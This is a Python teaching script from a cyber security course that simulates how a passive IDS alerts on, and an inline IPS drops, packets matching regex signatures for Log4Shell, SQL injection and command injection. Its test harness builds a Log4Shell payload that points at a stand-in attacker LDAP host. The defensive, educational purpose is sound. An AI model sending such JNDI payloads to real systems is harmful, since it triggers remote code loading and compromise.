"""
IDS (Passive Alerting) vs IPS (Active Inline Dropping) Execution Simulator
Author: Sukanta Hui | Institution: Coder & AccoTax Barrackpore
Course: Cyber Security - Module 005_002 (Topic 1)
"""

import re
from dataclasses import dataclass
from typing import Dict, List, Optional, Tuple

@dataclass
class PacketData:
    pkt_id: int
    src_ip: str
    dst_ip: str
    dst_port: int
    payload: bytes

class IdsVsIpsEngine:
    def __init__(self):
        # Known High-Confidence Attack Signatures
        self.signatures = [
            ("SIG-EXPLOIT-01", "Log4Shell RCE", re.compile(rb"\$\{jndi:(ldap|rmi|dns):", re.IGNORECASE)),
            ("SIG-EXPLOIT-02", "SQL Injection", re.compile(rb"(\bunion\s+select\b|'\s*or\s*'1'='1)", re.IGNORECASE)),
            ("SIG-EXPLOIT-03", "Command Injection", re.compile(rb";\s*(cat|chmod|id|whoami)\b", re.IGNORECASE))
        ]

    def process_as_ids(self, pkt: PacketData) -> Dict[str, any]:
        """Passive IDS Processing: Packet is forwarded to target; alert generated asynchronously."""
        matched_sig = None
        for sig_id, sig_name, pattern in self.signatures:
            if pattern.search(pkt.payload):
                matched_sig = (sig_id, sig_name)
                break

        if matched_sig:
            return {
                "mode": "PASSIVE_IDS",
                "packet_disposition": "FORWARDED_TO_TARGET (Packet reaches server!)",
                "exploit_status": "EXPLOIT_EXECUTED_ON_TARGET ⚠️",
                "soc_action": f"🚨 SIEM ALERT GENERATED: [{matched_sig[0]}] {matched_sig[1]}",
                "latency_added_us": 0.0,
                "business_impact": "Compromise occurred before analyst responded"
            }
        else:
            return {
                "mode": "PASSIVE_IDS",
                "packet_disposition": "FORWARDED_TO_TARGET",
                "exploit_status": "CLEAN_TRAFFIC_PROCESSED",
                "soc_action": "NO_ALERT",
                "latency_added_us": 0.0,
                "business_impact": "Normal operation"
            }

    def process_as_ips(self, pkt: PacketData, is_in_inline_mode: bool = True) -> Dict[str, any]:
        """Active Inline IPS Processing: Packet is inspected in-line; dropped if exploit detected."""
        matched_sig = None
        for sig_id, sig_name, pattern in self.signatures:
            if pattern.search(pkt.payload):
                matched_sig = (sig_id, sig_name)
                break

        if matched_sig and is_in_inline_mode:
            return {
                "mode": "ACTIVE_INLINE_IPS",
                "packet_disposition": "🛡️ DROPPED_INLINE (Packet discarded from forwarding buffer!)",
                "exploit_status": "EXPLOIT_BLOCKED_IN_FLIGHT ✔",
                "soc_action": f"🚨 THREAT BLOCKED + TCP RST SENT: [{matched_sig[0]}] {matched_sig[1]}",
                "latency_added_us": 18.5,
                "business_impact": "Zero compromise on target server"
            }
        elif matched_sig and not is_in_inline_mode:
            # IPS in Detection-Only / Learning Mode
            return {
                "mode": "IPS_LEARNING_MODE",
                "packet_disposition": "FORWARDED_TO_TARGET",
                "exploit_status": "SIMULATED_DROP_LOGGED",
                "soc_action": f"📝 AUDIT LOG: Would drop [{matched_sig[0]}] in active mode",
                "latency_added_us": 8.0,
                "business_impact": "Safe tuning mode without business disruption"
            }
        else:
            return {
                "mode": "ACTIVE_INLINE_IPS",
                "packet_disposition": "FORWARDED_TO_TARGET",
                "exploit_status": "CLEAN_TRAFFIC_PERMITTED",
                "soc_action": "PASSED_CLEAN",
                "latency_added_us": 12.0,
                "business_impact": "Clean transaction completed with minimal microsecond latency"
            }

# Execution Test Harness
if __name__ == "__main__":
    engine = IdsVsIpsEngine()
    print("=== IDS (Passive Alert) vs IPS (Active Drop) Execution Simulator ===")

    exploit_packet = PacketData(
        101, "198.51.100.25", "172.16.1.10", 443,
        b"GET /login?user=${jndi:ldap://attacker.com/exploit} HTTP/1.1\r\nHost: bank.gov.in"
    )

    print("\n--- 1. Passive IDS Simulation ---")
    ids_res = engine.process_as_ids(exploit_packet)
    print(f"Disposition: {ids_res['packet_disposition']}")
    print(f"Status     : {ids_res['exploit_status']}")
    print(f"SOC Action : {ids_res['soc_action']}")

    print("\n--- 2. Active Inline IPS Simulation ---")
    ips_res = engine.process_as_ips(exploit_packet, is_in_inline_mode=True)
    print(f"Disposition: {ips_res['packet_disposition']}")
    print(f"Status     : {ips_res['exploit_status']}")
    print(f"SOC Action : {ips_res['soc_action']}")
    print(f"Latency    : +{ips_res['latency_added_us']} µs")
